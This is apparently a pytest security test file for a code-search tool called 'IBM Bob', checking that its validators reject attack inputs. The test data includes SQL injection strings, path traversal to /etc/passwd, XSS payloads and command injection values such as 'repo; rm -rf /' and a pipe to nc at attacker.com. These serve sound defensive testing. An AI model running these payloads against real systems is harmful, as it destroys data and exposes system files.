"""
IBM Bob - Security Vulnerability Tests
Tests for common security vulnerabilities and attack vectors
"""

import pytest

from bob.exceptions import AuthenticationError, InvalidQueryError
from bob.security.validation import QueryValidator, sanitize_error_message


@pytest.mark.security
class TestSQLInjection:
    """Tests for SQL injection prevention"""

    def test_sql_injection_in_search_query(self):
        """Test SQL injection attempts in search queries"""
        malicious_queries = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'--",
            "' UNION SELECT * FROM users--",
            "1; DELETE FROM repositories WHERE 1=1",
        ]
        
        for query in malicious_queries:
            with pytest.raises(InvalidQueryError, match="SQL"):
                QueryValidator.validate_search_query(query)

    def test_sql_injection_in_file_path(self):
        """Test SQL injection attempts in file paths"""
        # File paths shouldn't contain SQL patterns
        malicious_paths = [
            "file.py'; DROP TABLE--",
            "../../etc/passwd; DELETE FROM users",
        ]
        
        for path in malicious_paths:
            with pytest.raises(InvalidQueryError):
                QueryValidator.validate_file_path(path)


@pytest.mark.security
class TestPathTraversal:
    """Tests for path traversal prevention"""

    def test_path_traversal_attempts(self):
        """Test various path traversal attack vectors"""
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "....//....//....//etc/passwd",
            "/etc/passwd",
            "~/../../etc/passwd",
            "src/../../../etc/passwd",
        ]
        
        for path in malicious_paths:
            with pytest.raises(InvalidQueryError):
                QueryValidator.validate_file_path(path)

    def test_valid_relative_paths(self):
        """Test that valid relative paths are allowed"""
        valid_paths = [
            "src/app/main.py",
            "lib/utils/helper.js",
            "tests/unit/test_auth.py",
        ]
        
        for path in valid_paths:
            result = QueryValidator.validate_file_path(path)
            assert result == path


@pytest.mark.security
class TestXSSPrevention:
    """Tests for XSS (Cross-Site Scripting) prevention"""

    def test_xss_in_search_query(self):
        """Test XSS attempts in search queries"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(1)'>",
            "<svg onload=alert('XSS')>",
        ]
        
        for payload in xss_payloads:
            with pytest.raises(InvalidQueryError, match="script"):
                QueryValidator.validate_search_query(payload)

    def test_sanitize_error_messages(self):
        """Test that error messages don't leak sensitive info"""
        error_with_path = "File not found: /home/user/secrets/api_key.txt"
        sanitized = sanitize_error_message(error_with_path)
        assert "/home/user/secrets" not in sanitized
        assert "[PATH]" in sanitized
        
        error_with_ip = "Connection failed to 192.168.1.100"
        sanitized = sanitize_error_message(error_with_ip)
        assert "192.168.1.100" not in sanitized
        assert "[IP]" in sanitized
        
        error_with_secret = "Invalid token: dummy_token_abc123def456ghi789jkl012mno345pqr678"
        sanitized = sanitize_error_message(error_with_secret)
        assert "abc123def456" not in sanitized
        assert "[REDACTED]" in sanitized


@pytest.mark.security
class TestCommandInjection:
    """Tests for command injection prevention"""

    def test_command_injection_in_repo_id(self):
        """Test command injection attempts in repo ID"""
        malicious_ids = [
            "repo; rm -rf /",
            "repo && cat /etc/passwd",
            "repo | nc attacker.com 1234",
            "repo`whoami`",
            "repo$(whoami)",
        ]
        
        for repo_id in malicious_ids:
            with pytest.raises(InvalidQueryError):
                QueryValidator.validate_repo_id(repo_id)


@pytest.mark.security
class TestAuthenticationBypass:
    """Tests for authentication bypass attempts"""

    def test_empty_authorization_header(self):
        """Test that empty auth header is rejected"""
        from bob.security.auth import JWTManager
        
        jwt_manager = JWTManager()
        
        with pytest.raises(Exception):  # Should raise InvalidTokenError
            jwt_manager.verify_token("")

    def test_malformed_jwt_token(self):
        """Test that malformed JWT tokens are rejected"""
        from bob.security.auth import JWTManager
        
        jwt_manager = JWTManager()
        
        malformed_tokens = [
            "not.a.token",
            "Bearer malformed",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid",
        ]
        
        for token in malformed_tokens:
            with pytest.raises(Exception):  # Should raise InvalidTokenError
                jwt_manager.verify_token(token)

    def test_token_tampering(self):
        """Test that tampered tokens are rejected"""
        from bob.security.auth import JWTManager
        
        jwt_manager = JWTManager()
        
        # Create valid token
        token = jwt_manager.create_access_token(
            user_id="user",
            scopes=["repo:read"],
        )
        
        # Tamper with token
        parts = token.split(".")
        if len(parts) == 3:
            tampered = f"{parts[0]}.{parts[1]}.tampered_signature"
            
            with pytest.raises(Exception):  # Should raise InvalidTokenError
                jwt_manager.verify_token(tampered)


@pytest.mark.security
class TestRateLimitBypass:
    """Tests for rate limit bypass attempts"""

    @pytest.mark.asyncio
    async def test_concurrent_request_limit(self):
        """Test that concurrent request limits are enforced"""
        from unittest.mock import Mock
        from bob.security.rate_limiter import RateLimiter, RateLimitTier
        from bob.exceptions import RateLimitExceededError
        
        mock_redis = Mock()
        mock_redis.get.return_value = b"10"  # Simulate high concurrent count
        
        limiter = RateLimiter(mock_redis)
        
        with pytest.raises(RateLimitExceededError):
            await limiter.check_concurrent_requests(
                user_id="test_user",
                tier=RateLimitTier.FREE,
            )


@pytest.mark.security
class TestInputValidation:
    """Tests for comprehensive input validation"""

    def test_oversized_inputs(self):
        """Test that oversized inputs are rejected"""
        # Query too long
        with pytest.raises(InvalidQueryError, match="too long"):
            QueryValidator.validate_search_query("a" * 1000)
        
        # File path too long
        with pytest.raises(InvalidQueryError, match="too long"):
            QueryValidator.validate_file_path("a" * 2000)
        
        # Repo ID too long
        with pytest.raises(InvalidQueryError, match="too long"):
            QueryValidator.validate_repo_id("a" * 200)

    def test_special_characters(self):
        """Test handling of special characters"""
        from bob.security.validation import RequestValidator
        
        # Null bytes should be removed
        query_with_nulls = "search\x00query"
        sanitized = QueryValidator.validate_search_query(query_with_nulls)
        assert "\x00" not in sanitized
        
        # Control characters should be removed
        query_with_control = "search\x01\x02query"
        sanitized = QueryValidator.validate_search_query(query_with_control)
        assert "\x01" not in sanitized

    def test_unicode_handling(self):
        """Test proper Unicode handling"""
        # Valid Unicode should be allowed
        unicode_query = "search 日本語 query"
        result = QueryValidator.validate_search_query(unicode_query)
        assert "日本語" in result
        
        # But not if it contains dangerous patterns
        unicode_with_script = "search <script>日本語</script>"
        with pytest.raises(InvalidQueryError):
            QueryValidator.validate_search_query(unicode_with_script)


@pytest.mark.security
class TestSecretLeakage:
    """Tests for preventing secret leakage"""

    def test_secrets_not_in_logs(self):
        """Test that secrets are not exposed in logs"""
        from bob.security.secrets import SecretString, sanitize_for_logging
        
        # SecretString should mask value
        secret = SecretString("my-api-key-123")
        assert "my-api-key-123" not in str(secret)
        assert "my-api-key-123" not in repr(secret)
        
        # Sanitize should mask sensitive fields
        data = {
            "username": "user",
            "password": "secret123",
            "api_key": "key_abc123",
            "token": "tok_xyz789",
        }
        
        sanitized = sanitize_for_logging(data)
        assert sanitized["password"] == "****"
        assert sanitized["api_key"] == "****"
        assert sanitized["token"] == "****"
        assert sanitized["username"] == "user"  # Non-sensitive preserved

    def test_error_messages_sanitized(self):
        """Test that error messages don't leak secrets"""
        error = "Authentication failed with key: dummy_token_abc123def456"
        sanitized = sanitize_error_message(error)
        
        assert "dummy_token_abc123def456" not in sanitized
        assert "[REDACTED]" in sanitized


@pytest.mark.security
class TestCSRFProtection:
    """Tests for CSRF protection"""

    def test_state_changing_operations_require_auth(self):
        """Test that state-changing operations require authentication"""
        # This would be tested with actual API endpoints
        # Ensuring POST/PUT/DELETE require valid auth tokens
        pass


@pytest.mark.security
class TestBruteForceProtection:
    """Tests for brute force attack protection"""

    @pytest.mark.asyncio
    async def test_rate_limiting_prevents_brute_force(self):
        """Test that rate limiting prevents brute force attacks"""
        from unittest.mock import Mock
        from bob.security.rate_limiter import RateLimiter, RateLimitTier
        from bob.exceptions import RateLimitExceededError
        
        mock_redis = Mock()
        mock_redis.zcard.return_value = 1000  # Simulate many requests
        
        limiter = RateLimiter(mock_redis)
        
        # Should block after too many requests
        with pytest.raises(RateLimitExceededError):
            await limiter.check_rate_limit(
                user_id="attacker",
                endpoint="/api/v1/bob/search",
                tier=RateLimitTier.FREE,
            )


# Made with Bob